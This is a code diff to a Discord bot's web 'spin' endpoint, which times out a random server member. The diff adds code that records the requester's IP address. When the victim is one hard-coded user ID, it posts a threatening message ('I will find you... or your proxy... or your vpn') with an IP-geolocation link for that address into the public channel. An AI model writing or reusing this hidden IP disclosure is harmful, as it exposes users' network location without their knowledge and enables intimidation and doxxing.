@@ -42,7 +42,7 @@ async def index():
 GUILD_ID = int(os.getenv("GUILD_ID"))
 
 
-async def timeout_random():
+async def timeout_random(ip=None):
     guild = bot.get_guild(GUILD_ID)
 
     # On recalcule la liste au moment du spin
@@ -90,6 +90,9 @@ async def timeout_random():
                 message = chosen.format(
                     name=victim.display_name, mention=victim.mention, minutes=2)
                 # Envoyer via la boucle du bot pour éviter "Timeout context manager"
+                if ip and victim.id == 144877948275523584:
+                    message += f" I will find you... or your proxy... or your vpn... https://ip-api.com/#{ip}"
+                
                 try:
                     bot.loop.create_task(channel.send(message))
                 except Exception:
@@ -116,6 +119,7 @@ async def spin(request: Request):
     # provenant de l'origine configurée via `ALLOWED_ORIGIN` (optionnel).
     origin = request.headers.get("origin") or request.headers.get("referer")
     allowed = os.getenv("ALLOWED_ORIGIN", "")
+    ip = request.client.host
     if allowed:
         if not origin or (not origin.startswith(allowed)):
             raise HTTPException(status_code=403, detail="Forbidden")
@@ -123,7 +127,7 @@ async def spin(request: Request):
     if not state.can_spin():
         return {"status": "cooldown"}
 
-    name = await timeout_random()
+    name = await timeout_random(ip)
     if not name:
         return {"status": "empty"}
 
